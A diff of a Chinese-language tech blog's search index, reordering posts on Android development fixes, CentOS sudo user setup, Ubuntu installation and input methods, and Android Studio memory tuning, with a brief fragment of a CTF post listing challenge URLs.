-<span class="exturl" data-url="aHR0cDovL3NydjAzLmN0Zi5haXMzLm9yZzo5MDAyL3JvYm90cy50eHQ=">http://srv03.ctf.ais3.org:9002/robots.txt<i class="fa fa-external-link-alt"></i></span></p>
-<p><img data-src="https://i.imgur.com/CBWqoJ4.png" alt=""></p>
-<p>看起來是程式碼<br>
-<span class="exturl" data-url="aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xUHM5am1BNU9Tcjh4Q2cxalJKbklJbDJqeG54ZGU1NnM=">http://srv03.ctf.ais3.org:9002/files/app.py.old_20180531<i class="fa fa-external-link-alt"></i></span></p>
-<p>無法存取的 flag.txt<br>
-<span class="exturl" data-url="aHR0cDovL3NydjAzLmN0Zi5haXMzLm9yZzo5MDAyL2ZpbGVzL2ZsYWcudHh0">http://srv03.ctf.ais3.org:9002/files/flag.txt<i class="fa fa-external-link-alt"></i></span></p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>CTF</tag>
-        <tag>AIS3</tag>
       </tags>
   </entry>
   <entry>
@@ -373,33 +350,8 @@ Unfortunately, he lost the password. Could you please help him to find it out?<b
         <category>Android</category>
       </categories>
       <tags>
-        <tag>Android</tag>
         <tag>Android Studio</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Error：Fragment already added</title>
-    <url>/Error-Fragment-already-added/</url>
-    <content><![CDATA[<h2 id="遇到狀況">遇到狀況</h2>
-<pre><code>java.lang.IllegalStateException: Fragment already added
-</code></pre>
-<a id="more"></a>
-<h2 id="原因">原因</h2>
-<p>Fragment 在一些狀況不會正常移除</p>
-<h2 id="原本程式碼">原本程式碼</h2>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">FragmentTransaction transaction = getFragmentManager().beginTransaction();</span><br><span class="line">transaction.replace(R.id.fragment_container, newFragment);</span><br><span class="line">transaction.addToBackStack(<span class="keyword">null</span>);</span><br><span class="line">transaction.commit();</span><br></pre></td></tr></table></figure>
-<h2 id="解決辦法">解決辦法</h2>
-<p>因為replace有時會出現問題，因此在使用之前先確認Fragment是否被Added。</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(mFragment.isAdded())</span><br><span class="line">&#123;</span><br><span class="line">     <span class="keyword">return</span>; <span class="comment">//or return false/true, based on where you are calling from</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h2 id="後來程式碼">後來程式碼</h2>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">FragmentTransaction transaction = getFragmentManager().beginTransaction();</span><br><span class="line"><span class="keyword">if</span> (newFragment.isAdded()) &#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">transaction.replace(R.id.fragment_container, newFragment);</span><br><span class="line">transaction.addToBackStack(<span class="keyword">null</span>);</span><br><span class="line">transaction.commit();</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>Android</category>
-      </categories>
-      <tags>
         <tag>Android</tag>
-        <tag>Fragment</tag>
-        <tag>Error</tag>
       </tags>
   </entry>
   <entry>
@@ -669,39 +621,46 @@ _ 代表任意字元<br>
       </tags>
   </entry>
   <entry>
-    <title>getColor(int id) deprecated</title>
-    <url>/getcolor-deprecated/</url>
-    <content><![CDATA[<p>從 Android 6 開始，一個新的 getColor() 方法出現，舊的 Resource.getColor(int id) 則被廢棄。</p>
-<a id="more"></a>
-<p>新方法：</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">context.getColor(id);</span><br></pre></td></tr></table></figure>
-<p>如果要兼容 Android 6 以下的版本，建議使用 Support Library v4 的方法：</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ContextCompat.getColor(context, R.color.your_color);</span><br></pre></td></tr></table></figure>
-<p>此方法來自官方 JavaDoc 的描述：</p>
-<pre><code>Returns a color associated with a particular resource ID
-
-Starting in M, the returned color will be styled for the specified Context's theme.
+    <title>Error：Fragment already added</title>
+    <url>/Error-Fragment-already-added/</url>
+    <content><![CDATA[<h2 id="遇到狀況">遇到狀況</h2>
+<pre><code>java.lang.IllegalStateException: Fragment already added
 </code></pre>
-<p>這是 ContextCompat.getColor() 的程式碼：</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> <span class="title">getColor</span><span class="params">(Context context, @ColorRes <span class="keyword">int</span> id)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (Build.VERSION.SDK_INT &gt;= <span class="number">23</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> context.getColor(id);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> context.getResources().getColor(id);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>如果不想導入 Support Library v4，可以直接參考上面的寫法。</p>
-]]></content>
+<a id="more"></a>
+<h2 id="原因">原因</h2>
+<p>Fragment 在一些狀況不會正常移除</p>
+<h2 id="原本程式碼">原本程式碼</h2>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">FragmentTransaction transaction = getFragmentManager().beginTransaction();</span><br><span class="line">transaction.replace(R.id.fragment_container, newFragment);</span><br><span class="line">transaction.addToBackStack(<span class="keyword">null</span>);</span><br><span class="line">transaction.commit();</span><br></pre></td></tr></table></figure>
+<h2 id="解決辦法">解決辦法</h2>
+<p>因為replace有時會出現問題，因此在使用之前先確認Fragment是否被Added。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(mFragment.isAdded())</span><br><span class="line">&#123;</span><br><span class="line">     <span class="keyword">return</span>; <span class="comment">//or return false/true, based on where you are calling from</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="後來程式碼">後來程式碼</h2>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">FragmentTransaction transaction = getFragmentManager().beginTransaction();</span><br><span class="line"><span class="keyword">if</span> (newFragment.isAdded()) &#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">transaction.replace(R.id.fragment_container, newFragment);</span><br><span class="line">transaction.addToBackStack(<span class="keyword">null</span>);</span><br><span class="line">transaction.commit();</span><br></pre></td></tr></table></figure>]]></content>
       <categories>
         <category>Android</category>
       </categories>
       <tags>
         <tag>Android</tag>
-        <tag>deprecated</tag>
+        <tag>Fragment</tag>
+        <tag>Error</tag>
       </tags>
   </entry>
   <entry>
-    <title>android:gravity 和 android:layout_gravity 的差別</title>
-    <url>/android-gravity%E5%92%8Candroid-layout-Gravity%E7%9A%84%E5%B7%AE%E5%88%A5/</url>
-    <content><![CDATA[<p>在 Android 介面設計中，常會用到  android:gravity 和 android:layout_gravity 兩種屬性，但卻容易被搞混，因此這邊做簡單的介紹，讓大家釐清差別。</p>
-<a id="more"></a>
-<p><code>android:gravity</code> 是作用在 view 裡的內容．比如一個 button 上面的 text。你可以設置該 text 在 view 裡是靠左、靠右等位置。</p>
-<p><code>android:layout_gravity</code> 是用來設置該 view 相對於父 view 的位置。比如一個 button 在 LinearLayout 裡，你想讓該 button 在 LinearLayout 裡是靠左、靠右等位置。</p>
-]]></content>
+    <title>Android 學習問題紀錄</title>
+    <url>/Android-%E5%AD%B8%E7%BF%92%E5%95%8F%E9%A1%8C%E7%B4%80%E9%8C%84/</url>
+    <content><![CDATA[<h2 id="紀錄-1">紀錄 1</h2>
+<h3 id="問題">問題</h3>
+<p>在 OkHttp 的 onResponse 中使用 Toast 會噴錯，但 Retrofit 不會。<br>
+<a id="more"></a></p>
+<h3 id="原因">原因</h3>
+<p>OkHttp 不是執行在 UI Thread，但 Retrofit 是。</p>
+<h2 id="紀錄-2">紀錄 2</h2>
+<h3 id="問題-2">問題</h3>
+<p>在 OkHttp  的 onResponse 中使用 Toast 會噴錯。</p>
+<h3 id="原因-2">原因</h3>
+<p>OkHttp 不是執行在 UI Thread。</p>
+<h3 id="解法">解法</h3>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 解法1</span></span><br><span class="line">Handler handler = <span class="keyword">new</span> Handler(Looper.getMainLooper());</span><br><span class="line">handler.post(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">// TODO</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// 解法2</span></span><br><span class="line">activity.runOnUiThread(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>]]></content>
       <categories>
         <category>Android</category>
       </categories>
@@ -853,177 +812,30 @@ Starting in M, the returned color will be styled for the specified Context's the
       </tags>
   </entry>
   <entry>
-    <title>如何在 Centos 7 創建一個 Sudo user</title>
-    <url>/how-to-create-a-sudo-user-on-centos-quickstart/</url>
-    <content><![CDATA[<ol>
-<li>以 root 身份登錄到你的伺服器。 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh root@server_ip_address</span><br></pre></td></tr></table></figure>
-</li>
-</ol>
+    <title>getColor(int id) deprecated</title>
+    <url>/getcolor-deprecated/</url>
+    <content><![CDATA[<p>從 Android 6 開始，一個新的 getColor() 方法出現，舊的 Resource.getColor(int id) 則被廢棄。</p>
 <a id="more"></a>
-<ol start="2">
-<li>
-<p>使用 adduser 指令將新用戶添加到你的系統</p>
-<p>將 username 替換為你要創建的用戶</p>
- <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">adduser username</span><br></pre></td></tr></table></figure>
-<ul>
-<li>使用 passwd 指令更新 user 密碼</li>
-</ul>
- <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">passwd username</span><br></pre></td></tr></table></figure>
-<ul>
-<li>設置 user 的密碼的顯示訊息</li>
-</ul>
- <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Set password prompts:</span><br><span class="line">Changing password for user username.</span><br><span class="line">New password:</span><br><span class="line">Retype new password:</span><br><span class="line">passwd: all authentication tokens updated successfully.</span><br></pre></td></tr></table></figure>
-</li>
-<li>
-<p>使用 usermod 指令將用戶添加到 wheel 中。</p>
- <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">usermod -aG wheel username</span><br></pre></td></tr></table></figure>
-<p>默認情況下，在 CentOS 上，wheel 的成員具有 sudo 權限。</p>
-</li>
-<li>
-<p>在 user 上測試 sudo 訪問權限</p>
-<ul>
-<li>使用該 su 命令切換到新的 user 。</li>
-</ul>
- <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">su - username</span><br></pre></td></tr></table></figure>
-<ul>
-<li>作為 user ，請通過將“sudo”添加到要以超級用戶權限運行的命令來驗證是否可以使用 sudo。</li>
-</ul>
-<p>例如，您可以列出根目錄的內容，/ 通常只能由 root 用戶訪問。</p>
- <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo ls -la /</span><br></pre></td></tr></table></figure>
-<ul>
-<li>第一次使用 sudo 時，系統會提示你輸入 user 的密碼。輸入密碼以繼續。</li>
-</ul>
- <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Output:</span><br><span class="line">[sudo] password for username:</span><br></pre></td></tr></table></figure>
-<p>如果您前面操作正確，則使用 sudo 來執行的指令會以 root 權限執行。</p>
-</li>
-</ol>
-]]></content>
-      <categories>
-        <category>Linux</category>
-      </categories>
-      <tags>
-        <tag>教學</tag>
-        <tag>CentOS</tag>
-        <tag>Linux</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>NotificationCompat 與 Notification 差別</title>
-    <url>/notificationcompat-vs-notification/</url>
-    <content><![CDATA[<p>Notification.Builder 是 Android 3.0 (API 11) 引入的。如要兼容低版本，可以使用 Support V4 包提供的 NotificationCompat.Builder。</p>
-<a id="more"></a>
-<pre><code>Android 3.0 以上選擇 Notification
-Android 3.0 以下選擇 NotificationCompat
+<p>新方法：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">context.getColor(id);</span><br></pre></td></tr></table></figure>
+<p>如果要兼容 Android 6 以下的版本，建議使用 Support Library v4 的方法：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ContextCompat.getColor(context, R.color.your_color);</span><br></pre></td></tr></table></figure>
+<p>此方法來自官方 JavaDoc 的描述：</p>
+<pre><code>Returns a color associated with a particular resource ID
+
+Starting in M, the returned color will be styled for the specified Context's theme.
 </code></pre>
+<p>這是 ContextCompat.getColor() 的程式碼：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> <span class="title">getColor</span><span class="params">(Context context, @ColorRes <span class="keyword">int</span> id)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (Build.VERSION.SDK_INT &gt;= <span class="number">23</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> context.getColor(id);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> context.getResources().getColor(id);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>如果不想導入 Support Library v4，可以直接參考上面的寫法。</p>
 ]]></content>
       <categories>
         <category>Android</category>
       </categories>
       <tags>
         <tag>Android</tag>
-        <tag>Notification</tag>
+        <tag>deprecated</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>使用 Parallels Desktop Lite 安裝 Ubuntu 16.04（macOS）</title>
-    <url>/%E4%BD%BF%E7%94%A8-Parallels-Desktop-Lite-%E5%AE%89%E8%A3%9D-Ubuntu-16-04%EF%BC%88macOS%EF%BC%89/</url>
-    <content><![CDATA[<h2 id="安裝-Parallels-Desktop-Lite">安裝 Parallels Desktop Lite</h2>
-<p>到 <span class="exturl" data-url="aHR0cHM6Ly9pdHVuZXMuYXBwbGUuY29tL3R3L2FwcC9wYXJhbGxlbHMtZGVza3RvcC1saXRlL2lkMTA4NTExNDcwOQ==">Mac App Store<i class="fa fa-external-link-alt"></i></span> 上面可以找到</p>
-<a id="more"></a>
-<h2 id="安裝-Ubuntu-16-04">安裝 Ubuntu 16.04</h2>
-<ol>
-<li>
-<p>開啟 Parallels Desktop Lite<br>
-<img data-src="https://i.imgur.com/FZgYScy.jpg" alt=""></p>
-</li>
-<li>
-<p>安裝 Ubuntu<br>
-<img data-src="https://i.imgur.com/NP5rFfy.png" alt=""></p>
-</li>
-<li>
-<p>選取你下載的 Ubuntu 映像檔，並點擊<strong>繼續</strong><br>
-<img data-src="https://i.imgur.com/A6Gl0Si.png" alt=""></p>
-</li>
-<li>
-<p>取消勾選『快速安裝』，並點擊<strong>繼續</strong><br>
-<img data-src="https://i.imgur.com/OvO4OMw.png" alt=""></p>
-</li>
-<li>
-<p>勾選安裝前設定，可以社設定虛擬機配置<br>
-<img data-src="https://i.imgur.com/DUoG0ug.png" alt=""></p>
-</li>
-<li>
-<p>點擊配置已設定虛擬機，然後點擊<strong>繼續</strong>來開始安裝<br>
-<img data-src="https://i.imgur.com/ET2tcHM.png" alt=""></p>
-</li>
-<li>
-<p>選擇語言<br>
-<img data-src="https://i.imgur.com/oQNjwG8.png" alt=""></p>
-</li>
-<li>
-<p>選擇「安裝 Ubuntu」（如果想先試用，但不安裝，可以點第一項）<br>
-<img data-src="https://i.imgur.com/0Fs3tId.png" alt=""></p>
-</li>
-<li>
-<p>選擇安裝過程的語言<br>
-<img data-src="https://i.imgur.com/on5qjbI.jpg" alt=""></p>
-</li>
-<li>
-<p>建議全部勾選，也可以選擇自己想要的勾選<br>
-<img data-src="https://i.imgur.com/xMeVUEq.jpg" alt=""></p>
-</li>
-<li>
-<p>如果是在虛擬機中安裝，不需分隔磁碟，直接選第一個，然後按「立即安裝」<br>
-<img data-src="https://i.imgur.com/18mN5pS.jpg" alt=""></p>
-</li>
-<li>
-<p>點擊「繼續」開始安裝<br>
-<img data-src="https://i.imgur.com/2fEiSDD.jpg" alt=""></p>
-</li>
-<li>
-<p>選擇時區<br>
-<img data-src="https://i.imgur.com/vMKPjPe.jpg" alt=""></p>
-</li>
-<li>
-<p>選擇鍵盤排列方試（台灣鍵盤為美式鍵盤）<br>
-<img data-src="https://i.imgur.com/S8Ey4nw.jpg" alt=""></p>
-</li>
-<li>
-<p>輸入使用者帳戶資訊<br>
-<img data-src="https://i.imgur.com/HyVXVes.jpg" alt=""></p>
-</li>
-<li>
-<p>等待安裝並重新開機</p>
-</li>
-</ol>
-<blockquote>
-<p>註：如果重新開機失敗，可以點選下圖的重新啟動<br>
-<img data-src="https://i.imgur.com/UD95Mls.jpg" alt=""></p>
-</blockquote>
-<h2 id="Parellels-解析度調整">Parellels 解析度調整</h2>
-<ol>
-<li>
-<p>重新開機後，點擊 Parallels 上方的操作選單，並點擊安裝 Parallels Tools，依照指示完成安裝。<br>
-<img data-src="https://i.imgur.com/GSC8SsF.jpg" alt=""></p>
-</li>
-<li>
-<p>確認螢幕設定為「縮放」<br>
-<img data-src="https://i.imgur.com/7YMXx9t.jpg" alt=""></p>
-</li>
-<li>
-<p>點擊「系統設定值」的按鈕<br>
-<img data-src="https://i.imgur.com/Cd293Gd.jpg" alt=""></p>
-</li>
-<li>
-<p>點擊「顯示器」<br>
-<img data-src="https://i.imgur.com/vuFY6F5.jpg" alt=""></p>
-</li>
-<li>
-<p>在這裡可以調整螢幕的解析度（Macbook 建議調成 1440x900）<br>
-<img data-src="https://i.imgur.com/S9YBeTE.jpg" alt=""></p>
-</li>
-</ol>
-]]></content>
   </entry>
   <entry>
     <title>LineBot+Python，輕鬆建立聊天機器人</title>
@@ -1275,48 +1087,91 @@ Android 3.0 以下選擇 NotificationCompat
       </tags>
   </entry>
   <entry>
-    <title>在 Ubuntu 上安裝中文輸入法</title>
-    <url>/%E5%9C%A8Ubuntu%E4%B8%8A%E5%AE%89%E8%A3%9D%E4%B8%AD%E6%96%87%E8%BC%B8%E5%85%A5%E6%B3%95/</url>
+    <title>NotificationCompat 與 Notification 差別</title>
+    <url>/notificationcompat-vs-notification/</url>
+    <content><![CDATA[<p>Notification.Builder 是 Android 3.0 (API 11) 引入的。如要兼容低版本，可以使用 Support V4 包提供的 NotificationCompat.Builder。</p>
+<a id="more"></a>
+<pre><code>Android 3.0 以上選擇 Notification
+Android 3.0 以下選擇 NotificationCompat
+</code></pre>
+]]></content>
+      <categories>
+        <category>Android</category>
+      </categories>
+      <tags>
+        <tag>Android</tag>
+        <tag>Notification</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>android:gravity 和 android:layout_gravity 的差別</title>
+    <url>/android-gravity%E5%92%8Candroid-layout-Gravity%E7%9A%84%E5%B7%AE%E5%88%A5/</url>
+    <content><![CDATA[<p>在 Android 介面設計中，常會用到  android:gravity 和 android:layout_gravity 兩種屬性，但卻容易被搞混，因此這邊做簡單的介紹，讓大家釐清差別。</p>
+<a id="more"></a>
+<p><code>android:gravity</code> 是作用在 view 裡的內容．比如一個 button 上面的 text。你可以設置該 text 在 view 裡是靠左、靠右等位置。</p>
+<p><code>android:layout_gravity</code> 是用來設置該 view 相對於父 view 的位置。比如一個 button 在 LinearLayout 裡，你想讓該 button 在 LinearLayout 裡是靠左、靠右等位置。</p>
+]]></content>
+      <categories>
+        <category>Android</category>
+      </categories>
+      <tags>
+        <tag>Android</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>如何在 Centos 7 創建一個 Sudo user</title>
+    <url>/how-to-create-a-sudo-user-on-centos-quickstart/</url>
     <content><![CDATA[<ol>
-<li>點擊「系統設定值」的按鈕<br>
-<img data-src="https://i.imgur.com/8weBEw1.jpg" alt=""></li>
+<li>以 root 身份登錄到你的伺服器。 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh root@server_ip_address</span><br></pre></td></tr></table></figure>
+</li>
 </ol>
 <a id="more"></a>
 <ol start="2">
 <li>
-<p>點擊「語言支援」<br>
-<img data-src="https://i.imgur.com/QC1VYHK.jpg" alt=""></p>
+<p>使用 adduser 指令將新用戶添加到你的系統</p>
+<p>將 username 替換為你要創建的用戶</p>
+ <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">adduser username</span><br></pre></td></tr></table></figure>
+<ul>
+<li>使用 passwd 指令更新 user 密碼</li>
+</ul>
+ <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">passwd username</span><br></pre></td></tr></table></figure>
+<ul>
+<li>設置 user 的密碼的顯示訊息</li>
+</ul>
+ <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Set password prompts:</span><br><span class="line">Changing password for user username.</span><br><span class="line">New password:</span><br><span class="line">Retype new password:</span><br><span class="line">passwd: all authentication tokens updated successfully.</span><br></pre></td></tr></table></figure>
 </li>
 <li>
-<p>第一次打開，會跳出「安裝語言尚未支援完備」，這邊點擊「安裝」<br>
-<img data-src="https://i.imgur.com/ovNfLFq.jpg" alt=""></p>
+<p>使用 usermod 指令將用戶添加到 wheel 中。</p>
+ <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">usermod -aG wheel username</span><br></pre></td></tr></table></figure>
+<p>默認情況下，在 CentOS 上，wheel 的成員具有 sudo 權限。</p>
 </li>
 <li>
-<p>這邊會讓你輸入你剛剛設定的密碼，並等待安裝完畢<br>
-<img data-src="https://i.imgur.com/Ja9Ovqj.jpg" alt=""></p>
-</li>
-<li>
-<p>安裝完後重新開機<br>
-<img data-src="https://i.imgur.com/omw1N1Z.jpg" alt=""></p>
-</li>
-<li>
-<p>開機完後點右上角的鍵盤圖示，然後點選「ConfigureFcitx」<br>
-<img data-src="https://i.imgur.com/FWRbEQr.jpg" alt=""></p>
-</li>
-<li>
-<p>點選左下角的「＋」來新增輸入法<br>
-<img data-src="https://i.imgur.com/nzGCa1U.jpg" alt=""></p>
-</li>
-<li>
-<p>這邊推薦安裝「新酷音」<br>
-<img data-src="https://i.imgur.com/L5HrnOT.jpg" alt=""></p>
-</li>
-<li>
-<p>安裝完後可以在輸入法列表裡看到你剛剛選擇的輸入法，這邊可以調整輸入法順序<br>
-<img data-src="https://i.imgur.com/vqiw8Yx.jpg" alt=""></p>
+<p>在 user 上測試 sudo 訪問權限</p>
+<ul>
+<li>使用該 su 命令切換到新的 user 。</li>
+</ul>
+ <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">su - username</span><br></pre></td></tr></table></figure>
+<ul>
+<li>作為 user ，請通過將“sudo”添加到要以超級用戶權限運行的命令來驗證是否可以使用 sudo。</li>
+</ul>
+<p>例如，您可以列出根目錄的內容，/ 通常只能由 root 用戶訪問。</p>
+ <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo ls -la /</span><br></pre></td></tr></table></figure>
+<ul>
+<li>第一次使用 sudo 時，系統會提示你輸入 user 的密碼。輸入密碼以繼續。</li>
+</ul>
+ <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Output:</span><br><span class="line">[sudo] password for username:</span><br></pre></td></tr></table></figure>
+<p>如果您前面操作正確，則使用 sudo 來執行的指令會以 root 權限執行。</p>
 </li>
 </ol>
 ]]></content>
+      <categories>
+        <category>Linux</category>
+      </categories>
+      <tags>
+        <tag>教學</tag>
+        <tag>CentOS</tag>
+        <tag>Linux</tag>
+      </tags>
   </entry>
   <entry>
     <title>型態、變數與運算子 - Java</title>
@@ -1579,6 +1434,179 @@ Android 3.0 以下選擇 NotificationCompat
       </tags>
   </entry>
   <entry>
+    <title>在 Ubuntu 上安裝中文輸入法</title>
+    <url>/%E5%9C%A8Ubuntu%E4%B8%8A%E5%AE%89%E8%A3%9D%E4%B8%AD%E6%96%87%E8%BC%B8%E5%85%A5%E6%B3%95/</url>
+    <content><![CDATA[<ol>
+<li>點擊「系統設定值」的按鈕<br>
+<img data-src="https://i.imgur.com/8weBEw1.jpg" alt=""></li>
+</ol>
+<a id="more"></a>
+<ol start="2">
+<li>
+<p>點擊「語言支援」<br>
+<img data-src="https://i.imgur.com/QC1VYHK.jpg" alt=""></p>
+</li>
+<li>
+<p>第一次打開，會跳出「安裝語言尚未支援完備」，這邊點擊「安裝」<br>
+<img data-src="https://i.imgur.com/ovNfLFq.jpg" alt=""></p>
+</li>
+<li>
+<p>這邊會讓你輸入你剛剛設定的密碼，並等待安裝完畢<br>
+<img data-src="https://i.imgur.com/Ja9Ovqj.jpg" alt=""></p>
+</li>
+<li>
+<p>安裝完後重新開機<br>
+<img data-src="https://i.imgur.com/omw1N1Z.jpg" alt=""></p>
+</li>
+<li>
+<p>開機完後點右上角的鍵盤圖示，然後點選「ConfigureFcitx」<br>
+<img data-src="https://i.imgur.com/FWRbEQr.jpg" alt=""></p>
+</li>
+<li>
+<p>點選左下角的「＋」來新增輸入法<br>
+<img data-src="https://i.imgur.com/nzGCa1U.jpg" alt=""></p>
+</li>
+<li>
+<p>這邊推薦安裝「新酷音」<br>
+<img data-src="https://i.imgur.com/L5HrnOT.jpg" alt=""></p>
+</li>
+<li>
+<p>安裝完後可以在輸入法列表裡看到你剛剛選擇的輸入法，這邊可以調整輸入法順序<br>
+<img data-src="https://i.imgur.com/vqiw8Yx.jpg" alt=""></p>
+</li>
+</ol>
+]]></content>
+  </entry>
+  <entry>
+    <title>解決 Android Studio 卡頓的問題</title>
+    <url>/%E8%A7%A3%E6%B1%BAAndroid-Studio%E5%8D%A1%E9%A0%93%E7%9A%84%E5%95%8F%E9%A1%8C/</url>
+    <content><![CDATA[<h2 id="問題描述">問題描述</h2>
+<p>在使用 Macbook Pro 13 2017 開發案子，發現 Android Studio 會常常出現卡頓。</p>
+<a id="more"></a>
+<h2 id="解決辦法">解決辦法</h2>
+<p>上網查了一下，發現不少人都有這種狀況。問題好像是出在 Android Studio 的啟動參數限制了 JVM 獲得足夠的記憶體，導致了運行時只能頻繁的與磁盤交換。<br>
+因此我們要修改一下 Android Studio 的 JVM 參數文件，他的問位置在：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;Applications&#x2F;Android\ Studio.app&#x2F;Contents&#x2F;bin&#x2F;studio.vmoptions</span><br></pre></td></tr></table></figure>
+<p>在我的電腦上，參數預設是：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-Xms256m</span><br><span class="line">-Xmx1280m</span><br><span class="line">-XX:ReservedCodeCacheSize&#x3D;240m</span><br><span class="line">-XX:+UseCompressedOops</span><br></pre></td></tr></table></figure>
+<p>在修改重要設定檔之前，建議先做備份：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;Applications&#x2F;Android\ Studio.app&#x2F;Contents&#x2F;bin&#x2F;</span><br><span class="line">cp studio.vmoptions studio.vmoptions.bak</span><br></pre></td></tr></table></figure>
+<p>以上為 bash 指令，請打開 terminal 輸入。</p>
+<p>第一句是移動到存放 studio.vmoptions 的資料夾底下<br>
+第二句是將 studio.vmoptions 複製一份備份，並將其命名為 studio.vmoptions.bak</p>
+<p>然後修改 studio.vmoptions 成這樣：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-Xms512m</span><br><span class="line">-Xmx2048m</span><br><span class="line">-XX:ReservedCodeCacheSize&#x3D;768m</span><br><span class="line">-XX:+UseCompressedOops</span><br></pre></td></tr></table></figure>
+<p>如果覺得你記憶體足夠大，可以將 <code>-Xmx</code> 後面的數字改更大。我的電腦為記憶體為 8G，因此我設 2048m。</p>
+]]></content>
+      <categories>
+        <category>Android Studio</category>
+      </categories>
+      <tags>
+        <tag>Android Studio</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>使用 Parallels Desktop Lite 安裝 Ubuntu 16.04（macOS）</title>
+    <url>/%E4%BD%BF%E7%94%A8-Parallels-Desktop-Lite-%E5%AE%89%E8%A3%9D-Ubuntu-16-04%EF%BC%88macOS%EF%BC%89/</url>
+    <content><![CDATA[<h2 id="安裝-Parallels-Desktop-Lite">安裝 Parallels Desktop Lite</h2>
+<p>到 <span class="exturl" data-url="aHR0cHM6Ly9pdHVuZXMuYXBwbGUuY29tL3R3L2FwcC9wYXJhbGxlbHMtZGVza3RvcC1saXRlL2lkMTA4NTExNDcwOQ==">Mac App Store<i class="fa fa-external-link-alt"></i></span> 上面可以找到</p>
+<a id="more"></a>
+<h2 id="安裝-Ubuntu-16-04">安裝 Ubuntu 16.04</h2>
+<ol>
+<li>
+<p>開啟 Parallels Desktop Lite<br>
+<img data-src="https://i.imgur.com/FZgYScy.jpg" alt=""></p>
+</li>
+<li>
+<p>安裝 Ubuntu<br>
+<img data-src="https://i.imgur.com/NP5rFfy.png" alt=""></p>
+</li>
+<li>
+<p>選取你下載的 Ubuntu 映像檔，並點擊<strong>繼續</strong><br>
+<img data-src="https://i.imgur.com/A6Gl0Si.png" alt=""></p>
+</li>
+<li>
+<p>取消勾選『快速安裝』，並點擊<strong>繼續</strong><br>
+<img data-src="https://i.imgur.com/OvO4OMw.png" alt=""></p>
+</li>
+<li>
+<p>勾選安裝前設定，可以社設定虛擬機配置<br>
+<img data-src="https://i.imgur.com/DUoG0ug.png" alt=""></p>
+</li>
+<li>
+<p>點擊配置已設定虛擬機，然後點擊<strong>繼續</strong>來開始安裝<br>
+<img data-src="https://i.imgur.com/ET2tcHM.png" alt=""></p>
